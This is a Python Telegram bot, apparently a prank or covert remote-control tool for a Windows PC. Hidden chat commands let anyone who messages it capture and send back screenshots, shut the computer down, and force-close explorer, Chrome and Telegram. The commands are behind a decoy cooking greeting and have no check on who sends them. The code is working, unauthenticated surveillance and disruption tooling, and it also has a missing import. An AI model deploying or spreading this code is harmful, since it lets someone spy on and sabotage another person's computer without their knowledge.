import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram import F
from aiogram.filters import Command
import os
import pyautogui
from aiogram.types import FSInputFile

# Включаем логирование, чтобы не пропустить важные сообщения
logging.basicConfig(level=logging.INFO)

# Объект бота
bot = Bot(token="")

# Диспетчер
dp = Dispatcher()

# Хэндлер на команду /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = [
        [types.KeyboardButton(text="/ALARM")],
        [types.KeyboardButton(text="/Screen")]
    ]
    keyboard = types.ReplyKeyboardMarkup(keyboard=kb)
    await message.answer("Как подавать котлеты?", reply_markup=keyboard)

# Хэндлер на команду /Pass
@dp.message(Command("Pass"))
async def cmd_pass(message: types.Message):
    await message.answer("Alow, hello ADMIN!")
    os.system("start explorer.exe")

# Хэндлер на команду /Screen
@dp.message(Command("Screen"))
async def cmd_screen(message: types.Message):
    try:
        # Делаем скриншот
        screenshot = pyautogui.screenshot()

        # Путь для сохранения скриншота
        screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
        print(f"Сохраняю скриншот по пути: {screenshot_path}")  # Лог для проверки пути

        # Сохраняем скриншот в файл
        screenshot.save(screenshot_path)

        # Проверяем, существует ли файл
        if os.path.exists(screenshot_path):
            # Отправляем скриншот пользователю
            await message.reply_photo(photo=open(screenshot_path, "rb"))
            # Удаляем файл после отправки (по желанию)
            os.remove(screenshot_path)
        else:
            await message.reply("Ошибка: скриншот не сохранился. Проверьте путь и права доступа.")
    except Exception as e:
        logging.error(f"Ошибка при создании скриншота: {e}")
        await message.reply("Не удалось сделать скриншот. Проверь логи.")

@dp.callback_query(F.data == "random_value")
async def send_random_value(callback: types.CallbackQuery):
    await callback.message.answer(str(randint(1, 10)))
    await callback.answer(
        text="Спасибо, что воспользовались ботом!",
        show_alert=True
    )
    # или просто await callback.answer()

# Хэндлер на команду /ALARM
@dp.message(Command("ALARM"))
async def cmd_alarm(message: types.Message):
    await message.answer("ALARM triggered!")
    os.system("start https://www.youtube.com/watch?v=2qM36NfDtjM&ab_channel=NuclearBomb435")

# Хэндлер на команду /Off
@dp.message(Command("Off"))
async def cmd_off(message: types.Message):
    await message.answer("Выключаю компьютер...")
    os.system("shutdown -s -t 1")

# Хэндлер на команду /kill
@dp.message(Command("kill"))
async def cmd_kill(message: types.Message):
    await message.answer("Закрываю приложения...")
    os.system("taskkill /f /im telegram.exe")
    os.system("taskkill /f /im explorer.exe")
    os.system("taskkill /f /im chrome.exe")

# Запуск процесса поллинга новых апдейтов
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
